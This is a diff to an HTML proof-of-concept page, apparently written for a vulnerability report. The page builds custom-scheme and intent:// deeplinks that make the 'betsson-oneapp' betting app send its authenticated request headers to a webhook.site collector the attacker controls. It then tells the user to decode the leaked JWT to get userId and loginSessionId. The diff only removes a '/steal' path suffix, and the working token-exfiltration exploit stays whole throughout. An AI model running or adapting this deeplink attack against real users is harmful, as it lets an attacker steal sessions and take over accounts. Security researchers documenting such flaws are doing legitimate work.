@@ -28,7 +28,7 @@
   <label for="wh">Your collector URL (https only)</label>
   <input id="wh" type="url" inputmode="url" autocomplete="off"
          placeholder="https://webhook.site/your-unique-id" />
-  <p class="muted">A path like <code>/steal</code> is appended automatically so it's easy to spot in your logs.</p>
+  <p class="muted">The collector URL is used exactly as entered (the app reads it from the <code>url</code> query param).</p>
 
   <a id="scheme" class="btn scheme disabled" href="#">1) Trigger via custom scheme</a>
   <a id="intent" class="btn intent disabled" href="#">2) Trigger via intent:// (fallback)</a>
@@ -38,8 +38,8 @@
   </div>
   <div class="out" id="preview">Enter a URL above to build the deeplink&hellip;</div>
 
-  <p class="muted" style="margin-top:24px">After triggering, open your webhook.site page &mdash; the inbound request to
-     <code>/steal</code> carries the leaked headers. Decode the <code>auth</code> JWT to see
+  <p class="muted" style="margin-top:24px">After triggering, open your webhook.site page &mdash; the inbound request
+     carries the leaked headers. Decode the <code>auth</code> JWT to see
      <code>userId</code> / <code>loginSessionId</code>.</p>
 
   <script>
@@ -59,7 +59,7 @@
                                    : 'Enter a URL above to build the deeplink...';
         return;
       }
-      var collector = base.replace(/\/+$/, '') + '/steal';
+      var collector = base.replace(/\/+$/, '');
       // the app reads getQueryParameter("url"); encode so query/special chars survive
       var enc = encodeURIComponent(collector);
       var schemeUrl = 'betsson-oneapp://promotion/?url=' + enc;
